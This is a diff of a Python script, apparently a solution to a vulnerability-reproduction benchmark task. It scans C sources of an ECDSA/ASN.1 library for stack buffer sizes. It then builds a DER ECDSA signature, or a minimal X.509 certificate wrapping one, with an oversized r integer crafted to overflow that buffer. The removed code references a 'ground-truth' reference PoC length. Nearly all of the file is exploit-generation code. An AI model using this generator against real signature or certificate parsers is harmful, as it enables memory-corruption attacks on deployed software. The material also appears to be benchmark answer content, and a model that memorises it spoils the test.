@@ -1,345 +1,462 @@
 import os
 import re
 import tarfile
-from typing import Dict, Iterator, List, Optional, Tuple
+import ast
+from typing import Dict, List, Tuple, Optional
+
+
+class _SafeEval(ast.NodeVisitor):
+    __slots__ = ("ok",)
+
+    def __init__(self) -> None:
+        self.ok = True
+
+    def generic_visit(self, node):
+        self.ok = False
+
+    def visit_Expression(self, node):
+        self.visit(node.body)
+
+    def visit_Constant(self, node):
+        if not isinstance(node.value, int):
+            self.ok = False
+
+    def visit_Num(self, node):
+        if not isinstance(node.n, int):
+            self.ok = False
+
+    def visit_UnaryOp(self, node):
+        if not isinstance(node.op, (ast.UAdd, ast.USub, ast.Invert)):
+            self.ok = False
+            return
+        self.visit(node.operand)
+
+    def visit_BinOp(self, node):
+        if not isinstance(
+            node.op,
+            (
+                ast.Add,
+                ast.Sub,
+                ast.Mult,
+                ast.FloorDiv,
+                ast.Mod,
+                ast.LShift,
+                ast.RShift,
+                ast.BitOr,
+                ast.BitAnd,
+                ast.BitXor,
+            ),
+        ):
+            self.ok = False
+            return
+        self.visit(node.left)
+        self.visit(node.right)
+
+    def visit_Paren(self, node):  # pragma: no cover
+        self.visit(node.value)
+
+
+def _strip_c_comments(s: str) -> str:
+    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
+    s = re.sub(r"//.*?$", "", s, flags=re.M)
+    return s
+
+
+def _sanitize_c_int_literals(expr: str) -> str:
+    expr = re.sub(r"\b(0[xX][0-9A-Fa-f]+|\d+)[uUlL]+\b", r"\1", expr)
+    return expr
+
+
+def _eval_int_expr(expr: str, defines: Dict[str, int]) -> Optional[int]:
+    if not expr:
+        return None
+    expr = _strip_c_comments(expr).strip()
+    if not expr:
+        return None
+    if "\n" in expr or "\\" in expr:
+        return None
+    if "sizeof" in expr or "?" in expr or ":" in expr:
+        return None
+    expr = _sanitize_c_int_literals(expr)
+
+    expr = re.sub(r"/", "//", expr)
+
+    for _ in range(10):
+        changed = False
+
+        def repl(m):
+            nonlocal changed
+            name = m.group(0)
+            if name in defines:
+                changed = True
+                return str(defines[name])
+            return name
+
+        expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)
+        expr = expr2
+        if not changed:
+            break
+
+    if re.search(r"\b[A-Za-z_]\w*\b", expr):
+        return None
+
+    try:
+        tree = ast.parse(expr, mode="eval")
+    except Exception:
+        return None
+
+    v = _SafeEval()
+    v.visit(tree)
+    if not v.ok:
+        return None
+
+    try:
+        val = eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}, {})
+    except Exception:
+        return None
+
+    if not isinstance(val, int):
+        return None
+    if val < 0:
+        return None
+    return val
+
+
+def _read_sources(src_path: str) -> List[Tuple[str, str]]:
+    out: List[Tuple[str, str]] = []
+    if os.path.isdir(src_path):
+        for root, _, files in os.walk(src_path):
+            for fn in files:
+                p = os.path.join(root, fn)
+                rel = os.path.relpath(p, src_path)
+                if not any(rel.lower().endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".hpp", ".cxx")):
+                    if "fuzz" not in rel.lower():
+                        continue
+                try:
+                    if os.path.getsize(p) > 2_000_000:
+                        continue
+                    with open(p, "rb") as f:
+                        data = f.read()
+                    try:
+                        text = data.decode("utf-8", errors="ignore")
+                    except Exception:
+                        continue
+                    out.append((rel.replace("\\", "/"), text))
+                except Exception:
+                    continue
+        return out
+
+    try:
+        with tarfile.open(src_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isreg():
+                    continue
+                name = m.name
+                lname = name.lower()
+                if not any(lname.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".hpp", ".cxx")):
+                    if "fuzz" not in lname and "oss-fuzz" not in lname:
+                        continue
+                if m.size <= 0 or m.size > 2_000_000:
+                    continue
+                try:
+                    f = tf.extractfile(m)
+                    if not f:
+                        continue
+                    data = f.read()
+                    try:
+                        text = data.decode("utf-8", errors="ignore")
+                    except Exception:
+                        continue
+                    out.append((name, text))
+                except Exception:
+                    continue
+    except Exception:
+        return []
+    return out
+
+
+def _parse_defines(files: List[Tuple[str, str]]) -> Dict[str, int]:
+    defs_raw: Dict[str, str] = {}
+    for _, text in files:
+        for line in text.splitlines():
+            if "#define" not in line:
+                continue
+            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", line)
+            if not m:
+                continue
+            name = m.group(1)
+            val = m.group(2).strip()
+            if not name or "(" in name:
+                continue
+            if not val:
+                continue
+            if val.endswith("\\"):
+                continue
+            defs_raw[name] = val
+
+    defs_eval: Dict[str, int] = {}
+    for _ in range(6):
+        changed = False
+        for k, v in list(defs_raw.items()):
+            if k in defs_eval:
+                continue
+            iv = _eval_int_expr(v, defs_eval)
+            if iv is not None:
+                defs_eval[k] = iv
+                changed = True
+        if not changed:
+            break
+    return defs_eval
+
+
+def _detect_input_kind(files: List[Tuple[str, str]]) -> str:
+    candidates: List[Tuple[str, str]] = []
+    for name, text in files:
+        lname = name.lower()
+        if "fuzz" in lname or "oss-fuzz" in lname or "fuzzer" in lname:
+            candidates.append((name, text))
+        elif "llvmfuzzertestoneinput" in text.lower():
+            candidates.append((name, text))
+
+    if candidates:
+        best = max(candidates, key=lambda nt: ("llvmfuzzertestoneinput" in nt[1].lower(), "fuzz" in nt[0].lower(), len(nt[1])))
+        tl = best[1].lower()
+        if any(k in tl for k in ("x509", "certificate", "crt_parse", "x509_crt_parse", "x509_parse", "d2i_x509", "x509_load")):
+            return "cert"
+        if any(k in tl for k in ("ecdsa_sig", "ecdsa", "asn1", "signature")) and not any(
+            k in tl for k in ("x509", "certificate", "crt_parse", "x509_crt_parse", "d2i_x509")
+        ):
+            return "sig"
+
+    joined_hint = "\n".join((n.lower() + "\n" + t.lower()) for n, t in files[:300])
+    if "llvmfuzzertestoneinput" in joined_hint and ("x509" in joined_hint or "certificate" in joined_hint):
+        return "cert"
+    return "sig"
+
+
+def _guess_overflow_len(files: List[Tuple[str, str]], defines: Dict[str, int]) -> int:
+    decl_re = re.compile(
+        r"(?m)^\s*(?!#)\s*(?!typedef\b)(?!struct\b)(?!enum\b)(?!union\b)"
+        r"(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:char|short|int|long|uint8_t|uint16_t|uint32_t|byte|u8|uchar)\s+"
+        r"([A-Za-z_]\w*)\s*\[\s*([^\]\n]{1,80})\s*\]\s*;"
+    )
+
+    interesting_name_re = re.compile(r"(?i)^(?:r|s|rs|sig|sign|signature|asn1|der|ecdsa|ecc|tmp|buf)\b")
+    copy_call_re_tpl = r"(?:memcpy|memmove|XMEMCPY|XMEMMOVE)\s*\(\s*{var}\b"
+
+    sizes_scored: List[Tuple[int, int]] = []
+
+    for fname, text in files:
+        lname = fname.lower()
+        if not any(k in lname for k in ("ecdsa", "ecc", "asn1", "x509", "tls", "ssl", "crypto", "sig", "sign")):
+            continue
+        tl = text.lower()
+        if not ("ecdsa" in tl or "ecc" in tl or "asn1" in tl or "signature" in tl or "x509" in tl):
+            continue
+
+        for m in decl_re.finditer(text):
+            var = m.group(1)
+            sexpr = m.group(2).strip()
+            if not var or not sexpr:
+                continue
+            if "static" in m.group(0):
+                continue
+            if not interesting_name_re.search(var):
+                window = tl[max(0, m.start() - 200) : m.start() + 200]
+                if not any(k in window for k in ("ecdsa", "asn1", "signature", "sig", "x509", "ecc")):
+                    continue
+
+            sz = _eval_int_expr(sexpr, defines)
+            if sz is None:
+                continue
+            if sz < 8 or sz > 1_000_000:
+                continue
+
+            score = 0
+            if interesting_name_re.search(var):
+                score += 3
+            if any(k in lname for k in ("ecdsa", "ecc")):
+                score += 3
+            if "x509" in lname:
+                score += 2
+            if any(k in tl for k in ("ecdsa", "ecc")):
+                score += 1
+            if "asn1" in tl:
+                score += 1
+            if re.search(copy_call_re_tpl.format(var=re.escape(var)), text):
+                score += 3
+
+            window = tl[max(0, m.start() - 300) : m.start() + 500]
+            if any(k in window for k in ("sig", "signature", "asn1", "ecdsa")):
+                score += 2
+
+            sizes_scored.append((score, sz))
+
+    direct_consts: List[int] = []
+    for _, text in files:
+        if "ecdsa" not in text.lower() and "signature" not in text.lower() and "asn1" not in text.lower():
+            continue
+        for cm in re.finditer(r"\b(4096|8192|16384|32768|40960|65536|0x1000|0x2000|0x4000|0x8000|0xA000)\b", text):
+            tok = cm.group(1)
+            try:
+                v = int(tok, 0)
+            except Exception:
+                continue
+            if 8 <= v <= 200_000:
+                direct_consts.append(v)
+
+    cand: List[int] = []
+    for score, sz in sizes_scored:
+        if score >= 6:
+            cand.append(sz)
+
+    for k, v in defines.items():
+        lk = k.lower()
+        if any(w in lk for w in ("sig", "signature", "ecdsa", "ecc", "asn1")) and 8 <= v <= 200_000:
+            cand.append(v)
+
+    cand.extend(direct_consts)
+
+    if not cand:
+        return 50000
+
+    likely = max(cand)
+    if likely < 16:
+        likely = 16
+    overflow = likely + 1
+
+    if overflow < 256 and any(x >= 4096 for x in cand):
+        overflow = max(cand) + 1
+
+    if overflow > 200_000:
+        overflow = 200_000
+    if overflow < 128:
+        overflow = 128
+    return overflow
+
+
+def _der_len(n: int) -> bytes:
+    if n < 0:
+        raise ValueError("negative length")
+    if n <= 127:
+        return bytes([n])
+    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(b)]) + b
+
+
+def _der_tag(tag: int, content: bytes) -> bytes:
+    return bytes([tag]) + _der_len(len(content)) + content
+
+
+def _der_int_from_bytes(b: bytes) -> bytes:
+    if not b:
+        b = b"\x00"
+    if b[0] & 0x80:
+        b = b"\x00" + b
+    return _der_tag(0x02, b)
+
+
+def _der_seq(items: List[bytes]) -> bytes:
+    return _der_tag(0x30, b"".join(items))
+
+
+def _der_set(items: List[bytes]) -> bytes:
+    return _der_tag(0x31, b"".join(items))
+
+
+def _der_oid(dotted: str) -> bytes:
+    parts = dotted.strip().split(".")
+    if len(parts) < 2:
+        raise ValueError("bad oid")
+    nums = [int(x) for x in parts]
+    if nums[0] > 2 or nums[1] >= 40:
+        raise ValueError("bad oid head")
+    out = bytearray()
+    out.append(nums[0] * 40 + nums[1])
+    for n in nums[2:]:
+        if n < 0:
+            raise ValueError("bad oid part")
+        enc = []
+        if n == 0:
+            enc = [0]
+        else:
+            while n > 0:
+                enc.append(n & 0x7F)
+                n >>= 7
+            enc.reverse()
+        for i, v in enumerate(enc):
+            if i != len(enc) - 1:
+                out.append(0x80 | v)
+            else:
+                out.append(v)
+    return _der_tag(0x06, bytes(out))
+
+
+def _der_printable_string(s: bytes) -> bytes:
+    return _der_tag(0x13, s)
+
+
+def _der_utctime(s: bytes) -> bytes:
+    return _der_tag(0x17, s)
+
+
+def _der_bit_string(payload: bytes, unused_bits: int = 0) -> bytes:
+    if not (0 <= unused_bits <= 7):
+        unused_bits = 0
+    return _der_tag(0x03, bytes([unused_bits]) + payload)
+
+
+def _der_ctx0_explicit(content: bytes) -> bytes:
+    return _der_tag(0xA0, content)
+
+
+def _build_ecdsa_sig_der(r_len: int, s_len: int = 1) -> bytes:
+    if r_len < 1:
+        r_len = 1
+    if s_len < 1:
+        s_len = 1
+    r = b"\x01" + (b"A" * (r_len - 1))
+    s = b"\x01" + (b"B" * (s_len - 1))
+    return _der_seq([_der_int_from_bytes(r), _der_int_from_bytes(s)])
+
+
+def _build_min_cert_with_ecdsa_sig(sig_der: bytes) -> bytes:
+    oid_ecdsa_with_sha256 = _der_oid("1.2.840.10045.4.3.2")
+    alg_sig = _der_seq([oid_ecdsa_with_sha256])
+
+    oid_cn = _der_oid("2.5.4.3")
+    atv = _der_seq([oid_cn, _der_printable_string(b"a")])
+    rdn = _der_set([atv])
+    name = _der_seq([rdn])
+
+    validity = _der_seq([_der_utctime(b"250101000000Z"), _der_utctime(b"260101000000Z")])
+
+    oid_ec_public_key = _der_oid("1.2.840.10045.2.1")
+    oid_prime256v1 = _der_oid("1.2.840.10045.3.1.7")
+    spki_alg = _der_seq([oid_ec_public_key, oid_prime256v1])
+
+    pubkey = b"\x04" + (b"\x01" * 32) + (b"\x02" * 32)
+    spki = _der_seq([spki_alg, _der_bit_string(pubkey, 0)])
+
+    version = _der_ctx0_explicit(_der_int_from_bytes(b"\x02"))
+    serial = _der_int_from_bytes(b"\x01")
+
+    tbs = _der_seq([version, serial, alg_sig, name, validity, name, spki])
+
+    sig_value = _der_bit_string(sig_der, 0)
+    cert = _der_seq([tbs, alg_sig, sig_value])
+    return cert
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        macros, candidates = self._analyze_source(src_path)
-        buf_size, confidence = self._estimate_buffer(macros, candidates)
+        files = _read_sources(src_path)
+        defines = _parse_defines(files) if files else {}
+        kind = _detect_input_kind(files) if files else "sig"
+        overflow_len = _guess_overflow_len(files, defines) if files else 50000
 
-        len_r = self._choose_r_len(buf_size, confidence)
-        return self._build_ecdsa_der_signature(len_r=len_r, len_s=1)
+        sig = _build_ecdsa_sig_der(overflow_len, 1)
 
-    def _analyze_source(self, src_path: str) -> Tuple[Dict[str, int], List[Tuple[int, int, str, str]]]:
-        macros: Dict[str, int] = {}
-        candidates: List[Tuple[int, int, str, str]] = []  # (size, score, varname, path)
-
-        for path, text in self._iter_source_texts(src_path):
-            if not text:
-                continue
-            self._collect_macros(text, macros)
-
-        for path, text in self._iter_source_texts(src_path):
-            if not text:
-                continue
-            candidates.extend(self._collect_buffer_candidates(path, text, macros))
-
-        return macros, candidates
-
-    def _iter_source_texts(self, src_path: str) -> Iterator[Tuple[str, str]]:
-        if os.path.isdir(src_path):
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    p = os.path.join(root, fn)
-                    if not self._is_source_filename(fn):
-                        continue
-                    try:
-                        st = os.stat(p)
-                        if st.st_size > 5_000_000:
-                            continue
-                        with open(p, "rb") as f:
-                            b = f.read()
-                        yield p, self._safe_decode(b)
-                    except Exception:
-                        continue
-            return
-
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
-                        continue
-                    name = m.name
-                    base = os.path.basename(name)
-                    if not self._is_source_filename(base):
-                        continue
-                    if m.size > 5_000_000:
-                        continue
-                    try:
-                        f = tf.extractfile(m)
-                        if f is None:
-                            continue
-                        b = f.read()
-                        yield name, self._safe_decode(b)
-                    except Exception:
-                        continue
-        except Exception:
-            return
-
-    def _is_source_filename(self, fn: str) -> bool:
-        fn = fn.lower()
-        return fn.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".hxx"))
-
-    def _safe_decode(self, b: bytes) -> str:
-        try:
-            return b.decode("utf-8", errors="ignore")
-        except Exception:
-            try:
-                return b.decode("latin-1", errors="ignore")
-            except Exception:
-                return ""
-
-    def _strip_line_comments(self, line: str) -> str:
-        if "//" in line:
-            line = line.split("//", 1)[0]
-        return line
-
-    def _collect_macros(self, text: str, macros: Dict[str, int]) -> None:
-        lines = text.splitlines()
-        for line in lines:
-            line = self._strip_line_comments(line).strip()
-            if not line.startswith("#"):
-                continue
-            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", line)
-            if not m:
-                continue
-            name = m.group(1)
-            expr = m.group(2).strip()
-            if not name or not expr:
-                continue
-            if "\\" in expr:
-                continue
-            if any(ch in expr for ch in ('"', "'", "{", "}", ";")):
-                continue
-            val = self._try_eval_int_expr(expr, macros)
-            if val is not None:
-                if -1_000_000_000 <= val <= 1_000_000_000:
-                    macros.setdefault(name, val)
-
-        # Also pick up enum constants in a limited, safe way
-        for m in re.finditer(r"\b([A-Z][A-Z0-9_]{2,})\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b", text):
-            name = m.group(1)
-            expr = m.group(2)
-            if name in macros:
-                continue
-            val = self._try_eval_int_expr(expr, macros)
-            if val is not None:
-                if 0 <= val <= 1_000_000_000:
-                    macros[name] = val
-
-    def _collect_buffer_candidates(self, path: str, text: str, macros: Dict[str, int]) -> List[Tuple[int, int, str, str]]:
-        low = text.lower()
-        kw_score = 0
-        if "ecdsa" in low:
-            kw_score += 4
-        if "ecc" in low:
-            kw_score += 2
-        if "asn1" in low or "asn.1" in low:
-            kw_score += 4
-        if "der" in low:
-            kw_score += 2
-        if "signature" in low or "sig" in low:
-            kw_score += 1
-
-        if kw_score < 6:
-            return []
-
-        # Restrict searching to avoid excessive work on very large text
-        # Still allows most likely vulnerable files
-        out: List[Tuple[int, int, str, str]] = []
-
-        # Common stack buffers
-        arr_re = re.compile(
-            r"\b(?:unsigned\s+char|uint8_t|byte|u8|char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n\r;]+)\s*\]\s*;",
-            re.M,
-        )
-        for m in arr_re.finditer(text):
-            var = m.group(1)
-            expr = m.group(2).strip()
-            if "sizeof" in expr:
-                continue
-            size = self._try_eval_int_expr(expr, macros)
-            if size is None:
-                continue
-            if not (1 <= size <= 1_000_000):
-                continue
-            # Focus on plausible buffers for this bug: not too tiny, not huge
-            if size < 8 or size > 1_000_000:
-                continue
-            vlow = var.lower()
-            vscore = 0
-            if vlow in ("r", "s"):
-                vscore += 10
-            elif vlow in ("rs", "sig", "signature", "buf", "tmp", "temp", "scratch"):
-                vscore += 4
-            elif vlow.startswith(("sig", "asn", "der")):
-                vscore += 2
-            if "sig" in vlow:
-                vscore += 1
-            score = kw_score + vscore
-            out.append((size, score, var, path))
-
-        # alloca candidates
-        alloca_re = re.compile(r"\balloca\s*\(\s*([^)]+?)\s*\)")
-        for m in alloca_re.finditer(text):
-            expr = m.group(1).strip()
-            if "sizeof" in expr:
-                continue
-            size = self._try_eval_int_expr(expr, macros)
-            if size is None:
-                continue
-            if 8 <= size <= 1_000_000:
-                score = kw_score + 2
-                out.append((size, score, "alloca", path))
-
-        return out
-
-    def _normalize_int_literals(self, expr: str) -> str:
-        # Remove common C integer suffixes
-        expr = re.sub(r"\b(0x[0-9A-Fa-f]+|\d+)\s*(?:[uU](?:ll|LL|l|L)?|(?:ll|LL|l|L)[uU]?)\b", r"\1", expr)
-        # Remove outer parentheses
-        expr = expr.strip()
-        while expr.startswith("(") and expr.endswith(")"):
-            inner = expr[1:-1].strip()
-            if inner.count("(") == inner.count(")"):
-                expr = inner
-            else:
-                break
-        return expr
-
-    def _try_eval_int_expr(self, expr: str, macros: Dict[str, int]) -> Optional[int]:
-        expr = self._strip_line_comments(expr)
-        expr = self._normalize_int_literals(expr)
-        if not expr:
-            return None
-
-        if "sizeof" in expr or "{" in expr or "}" in expr:
-            return None
-
-        # Replace known macros
-        def repl_ident(m: re.Match) -> str:
-            name = m.group(0)
-            if name in macros:
-                return str(macros[name])
-            return name
-
-        expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_ident, expr)
-
-        # If any unknown identifiers remain, we won't eval
-        if re.search(r"\b[A-Za-z_]\w*\b", expr2):
-            return None
-
-        # Permit only a conservative set of characters/operators
-        if not re.fullmatch(r"[0-9xXa-fA-F\s\+\-\*\/\%\&\|\^\~\(\)\<\>]+", expr2):
-            return None
-
-        # Avoid division by zero and very long expressions
-        if len(expr2) > 200:
-            return None
-
-        try:
-            # Evaluate using Python with integer semantics; shifts and bit ops behave similarly
-            val = eval(expr2, {"__builtins__": None}, {})
-        except Exception:
-            return None
-        if not isinstance(val, int):
-            return None
-        return val
-
-    def _estimate_buffer(
-        self, macros: Dict[str, int], candidates: List[Tuple[int, int, str, str]]
-    ) -> Tuple[Optional[int], float]:
-        # High confidence: r/s arrays in ECDSA ASN.1 code
-        rs = [(sz, sc, v, p) for (sz, sc, v, p) in candidates if v.lower() in ("r", "s")]
-        if rs:
-            # Prefer the highest score, then largest size (some libs use +1 for sign)
-            rs.sort(key=lambda x: (x[1], x[0]), reverse=True)
-            best_sz = rs[0][0]
-            # If both r and s exist, take max
-            best_sz = max(x[0] for x in rs[:8])
-            return best_sz, 0.95
-
-        # Medium confidence: candidates exist but not explicit r/s
-        if candidates:
-            # choose large-ish to reduce underestimation risk
-            candidates.sort(key=lambda x: (x[1], x[0]), reverse=True)
-            top = candidates[:20]
-            max_sz = max(sz for (sz, _, __, ___) in top)
-            # But avoid selecting absurdly large unrelated buffers when smaller ones exist with similar score
-            # Pick the maximum size among the highest-score group
-            top_score = top[0][1]
-            group = [c for c in top if c[1] >= top_score - 2]
-            max_sz2 = max(sz for (sz, _, __, ___) in group)
-            est = max(max_sz2, max_sz)
-            return est, 0.6
-
-        # Low confidence: use macros heuristics
-        macro_cands = []
-        for k, v in macros.items():
-            kl = k.lower()
-            if v <= 0 or v > 1_000_000:
-                continue
-            if "ecc" in kl or "ecdsa" in kl:
-                if "max" in kl and ("byte" in kl or "size" in kl or "len" in kl):
-                    macro_cands.append(v)
-                elif kl.endswith(("bytes", "size", "len")) and v <= 4096:
-                    macro_cands.append(v)
-        if macro_cands:
-            return max(macro_cands), 0.4
-
-        return None, 0.0
-
-    def _choose_r_len(self, buf_size: Optional[int], confidence: float) -> int:
-        # Ground-truth per-integer size implied by provided reference PoC
-        gt_int_len = 20893
-
-        if buf_size is None or confidence <= 0.01:
-            return gt_int_len
-
-        # Ensure we exceed the likely stack buffer by a margin; cap to gt_int_len for safety,
-        # since gt PoC triggers vulnerability => stack buffer < gt_int_len
-        if confidence >= 0.9:
-            # small but reliable overflow
-            target = max(buf_size + 64, buf_size * 4)
-            return min(max(128, target), gt_int_len)
-        elif confidence >= 0.5:
-            target = max(buf_size + 256, buf_size * 8, 1024)
-            return min(target, gt_int_len)
-        else:
-            target = max(buf_size + 1024, buf_size * 16, 4096)
-            return min(target, gt_int_len)
-
-    def _der_len(self, n: int) -> bytes:
-        if n < 0:
-            raise ValueError("negative length")
-        if n < 128:
-            return bytes([n])
-        # long form
-        b = []
-        x = n
-        while x > 0:
-            b.append(x & 0xFF)
-            x >>= 8
-        b = bytes(reversed(b))
-        return bytes([0x80 | len(b)]) + b
-
-    def _der_integer(self, value_bytes: bytes) -> bytes:
-        # Ensure non-negative and minimal encoding.
-        if not value_bytes:
-            value_bytes = b"\x00"
-        # If MSB is set, prepend 0x00 for positive integer in DER.
-        if value_bytes[0] & 0x80:
-            value_bytes = b"\x00" + value_bytes
-        # Avoid non-minimal encoding: strip leading 0x00 where not needed.
-        while len(value_bytes) > 1 and value_bytes[0] == 0x00 and not (value_bytes[1] & 0x80):
-            value_bytes = value_bytes[1:]
-        return b"\x02" + self._der_len(len(value_bytes)) + value_bytes
-
-    def _build_ecdsa_der_signature(self, len_r: int, len_s: int) -> bytes:
-        if len_r < 1:
-            len_r = 1
-        if len_s < 1:
-            len_s = 1
-        if len_r > 60000:
-            len_r = 60000
-        if len_s > 60000:
-            len_s = 60000
-
-        r = b"\x01" * len_r
-        s = b"\x01" * len_s
-        int_r = self._der_integer(r)
-        int_s = self._der_integer(s)
-        content = int_r + int_s
-        return b"\x30" + self._der_len(len(content)) + content
+        if kind == "cert":
+            return _build_min_cert_with_ecdsa_sig(sig)
+        return sig
